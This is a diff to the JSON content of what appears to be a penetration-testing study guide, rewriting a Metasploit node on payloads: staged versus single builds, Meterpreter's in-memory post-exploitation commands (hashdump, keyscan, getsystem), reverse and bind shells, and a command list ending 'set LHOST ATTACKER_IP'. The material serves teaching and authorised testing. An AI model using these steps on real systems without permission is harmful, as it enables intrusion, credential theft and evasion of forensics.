@@ -123,13 +123,14 @@
             {
               "id": "msf-payloads",
               "label": "Payloads (show payloads)",
-              "detail": "What runs on the target once the exploit lands. show payloads lists only the ones that fit this module. The payload must match your listener and the target's architecture.",
-              "cmd": ["msf6 exploit(...) > show payloads", "msf6 exploit(...) > set payload <index no.>", "msf6 exploit(...) > set LPORT 443"],
+              "detail": "The code sent with the exploit that runs on the target, usually to return a shell: the exploit's job is to land it, the payload's job is to connect back. Run from inside an exploit module, show payloads lists only the ones that fit (msfconsole has already filtered to the target OS and arch), and set payload <no.> selects one, which adds its own options (LHOST, LPORT). The list is long, so filter with grep; ifconfig prints your LHOST without leaving the console.",
+              "cmd": ["msf6 exploit(...) > show payloads", "msf6 exploit(...) > grep meterpreter grep reverse_tcp show payloads", "msf6 exploit(...) > set payload 15", "msf6 exploit(...) > set LHOST ATTACKER_IP"],
               "children": [
-                { "id": "pl-meterpreter", "label": "Meterpreter", "detail": "Metasploit's in-memory agent, with built-in commands for files, processes, credentials and pivoting." },
-                { "id": "pl-bind", "label": "Shell binds", "detail": "The target opens a listening port and you connect to it. Needs that port reachable from you." },
-                { "id": "pl-reverse", "label": "Reverse shells", "detail": "The target connects back to your listener (LHOST/LPORT). Works through most NAT and inbound filtering." },
-                { "id": "pl-exe", "label": "EXE", "detail": "A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler." }
+                { "id": "pl-staging", "label": "Singles, stagers, stages", "detail": "Three payload builds. A single carries the exploit and the whole task in one; self-contained and stable, but large, and some exploits cannot fit it. A staged payload splits the work: a small, reliable stager (Stage0) runs first and opens the connection back (reverse_tcp, reverse_https, bind_tcp), then pulls a larger stage (Stage1) with no size limit, like Meterpreter or VNC. A / in the payload name marks a staged pair: windows/shell_bind_tcp is a single, windows/shell/bind_tcp is stager + stage. Metasploit picks the stager for you." },
+                { "id": "pl-meterpreter", "label": "Meterpreter", "detail": "The multi-purpose stage. Injected as a DLL and run entirely in memory, leaving nothing on disk, so it is hard to spot with ordinary forensics; extensions load and unload on the fly. Its own prompt takes Linux-style commands, not Windows ones: getuid, not whoami. From it: hashdump, screenshot, keyscan, getsystem, migrate, and shell to drop into a real cmd.exe on the host." },
+                { "id": "pl-bind", "label": "Shell binds", "detail": "The target opens a listening port and you connect in. Needs that port reachable from you, so it fails behind inbound filtering; reverse shells are usually preferred." },
+                { "id": "pl-reverse", "label": "Reverse shells", "detail": "The target dials back to your listener (LHOST/LPORT). It rides outbound traffic, which firewalls trust more than inbound, so it works through most NAT and filtering. Still watched, so tread carefully." },
+                { "id": "pl-exe", "label": "EXE", "detail": "A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler. Beyond Metasploit's own payloads, frameworks like Empire and Cobalt Strike cover the same ground on real engagements." }
               ]
             },
             {
